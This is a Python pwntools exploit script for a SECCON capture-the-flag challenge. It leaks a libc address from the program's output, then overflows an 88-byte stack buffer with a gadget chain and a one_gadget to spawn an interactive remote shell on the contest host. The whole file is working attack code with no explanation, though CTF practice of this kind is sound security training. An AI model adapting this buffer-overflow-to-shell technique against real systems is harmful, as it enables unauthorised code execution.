#!/usr/bin/env python

from pwn import *

######UPDATE ON 10/6 to fix the python versioning#######

exe = ELF("bin/chall_patched")
libc = ELF("lib/libc.so.6")
ld = ELF("lib/ld-2.31.so")

context.binary = exe
leak_offset = 0x1F12E8
one_gadget = 0xe3afe
setup = 0x0000000000023b63 #: pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("koncha.seccon.games", 9001)

    return r


def main():
    r = conn()
    r.sendlineafter('?\n', '')
    r.recvuntil('you, ')
    chef = r.recv(6)
    leak = u64(chef.ljust(8,'\x00'))
    log.info('leak: {}'.format(hex(leak)))
    libc_base = leak - leak_offset
    payload = "A"*88
    payload += p64(libc_base+setup)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(libc_base+one_gadget)
    #gdb.attach(r)

    r.sendlineafter('?\n', payload)
    r.interactive()


if __name__ == "__main__":
    main()
